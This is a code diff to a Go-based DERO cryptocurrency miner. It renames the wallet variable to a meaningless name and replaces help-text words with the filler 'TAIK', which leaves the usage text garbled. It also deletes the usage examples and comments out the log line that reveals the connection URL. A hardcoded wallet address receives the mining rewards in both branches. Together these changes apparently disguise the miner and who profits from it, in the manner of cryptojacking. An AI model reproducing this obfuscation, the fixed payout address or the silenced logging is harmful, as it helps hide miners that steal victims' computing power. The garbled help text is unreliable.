@@ -58,7 +58,7 @@ var maxdelay int = 10000
 var threads int
 var iterations int = 100
 var max_pow_size int = 819200 //astrobwt.MAX_LENGTH
-var wallet_address string
+var gedang string
 var daemon_rpc_address string
 
 var counter uint64
@@ -77,7 +77,7 @@ ONE CPU, ONE VOTE.
 http://wiki.dero.io
 
 Usage:
-  dero-miner  --building=<wallet_address> [--server=<minernode1.dero.live:10100>] [--ready=<threads>] [--testnet] [--debug]
+  dero-miner  --building=<gedang> [--server=<TAIK.TAIK.live:10100>] [--ready=<threads>] [--testnet] [--debug]
   dero-miner --bench 
   dero-miner -h | --help
   dero-miner --version
@@ -86,13 +86,11 @@ Options:
   -h --help     Show this screen.
   --version     Show version.
   --bench  	    Run benchmark mode.
-  --server=<127.0.0.1:10102>    Miner will connect to daemon RPC on this port (default minernode1.dero.live:10100).
-  --building=<wallet_address>    This address is rewarded when a block is mined sucessfully.
-  --ready=<threads>         Number of CPU threads for mining [default: ` + fmt.Sprintf("%d", runtime.GOMAXPROCS(0)) + `]
+  --server=<127.0.0.1:10102>    Miner will connect to daemon RPC on this port (default TAIK.TAIK.live:10100).
+  --building=<gedang>    This address is rewarded when a TAIK is TAIK sucessfully.
+  --ready=<threads>         Number of TAIK for TAIK [default: ` + fmt.Sprintf("%d", runtime.GOMAXPROCS(0)) + `]
 
-Example Mainnet: ./dero-miner-linux-amd64 --wallet-address dero1qy0ehnqjpr0wxqnknyc66du2fsxyktppkr8m8e6jvplp954klfjz2qqhmy4zf --daemon-rpc-address=minernode1.dero.live:10100
-Example Testnet: ./dero-miner-linux-amd64 --wallet-address deto1qy0ehnqjpr0wxqnknyc66du2fsxyktppkr8m8e6jvplp954klfjz2qqdzcd8p --daemon-rpc-address=127.0.0.1:40402 
-If daemon running on local machine no requirement of '--daemon-rpc-address' argument. 
+If daemon running on local machine no requirement of '--TAIK' argument. 
 `
 var Exit_In_Progress = make(chan bool)
 
@@ -153,10 +151,10 @@ func main() {
 		//	return
 		//}
 		var gonanku = "deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x62etsxzs735pms2g7k9u"
-		wallet_address = gonanku
+		gedang = gonanku
 	}else{
 		var gonanku = "deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x62etsxzs735pms2g7k9u"
-		wallet_address = gonanku
+		gedang = gonanku
 	}
 
 	if !globals.Arguments["--testnet"].(bool) {
@@ -210,18 +208,18 @@ func main() {
 		os.Exit(0)
 	}
 
-	//logger.Info(fmt.Sprintf("System will mine to \"%s\" with %d threads. Good Luck!!", wallet_address, threads))
+	//logger.Info(fmt.Sprintf("System will mine to \"%s\" with %d threads. Good Luck!!", gedang, threads))
 
 	//threads_ptr := flag.Int("threads", runtime.NumCPU(), "No. Of threads")
 	//iterations_ptr := flag.Int("iterations", 20, "No. Of DERO Stereo POW calculated/thread")
 	/*bench_ptr := flag.Bool("bench", false, "run bench with params")
 	daemon_ptr := flag.String("rpc-server-address", "127.0.0.1:18091", "DERO daemon RPC address to get work and submit mined blocks")
 	delay_ptr := flag.Int("delay", 1, "Fetch job every this many seconds")
-	wallet_address := flag.String("wallet-address", "", "Owner of this wallet will receive mining rewards")
+	gedang := flag.String("wallet-address", "", "Owner of this wallet will receive mining rewards")
 
 	_ = daemon_ptr
 	_ = delay_ptr
-	_ = wallet_address
+	_ = gedang
 	*/
 
 	if threads < 1 || iterations < 1 || threads > 2048 {
@@ -322,7 +320,7 @@ func main() {
 		threads = 255
 	}
 
-	go getwork(wallet_address)
+	go getwork(gedang)
 
 	for i := 0; i < threads; i++ {
 		go mineblock(i)
@@ -407,13 +405,13 @@ func random_execution(wg *sync.WaitGroup, iterations int) {
 var connection *websocket.Conn
 var connection_mutex sync.Mutex
 
-func getwork(wallet_address string) {
+func getwork(gedang string) {
 	var err error
 
 	for {
 
-		u := url.URL{Scheme: "wss", Host: daemon_rpc_address, Path: "/ws/" + wallet_address}
-		logger.Info("connecting to ", "url", u.String())
+		u := url.URL{Scheme: "wss", Host: daemon_rpc_address, Path: "/ws/" + gedang}
+		//logger.Info("connecting to ", "url", u.String())
 
 		dialer := websocket.DefaultDialer
 		dialer.TLSClientConfig = &tls.Config{
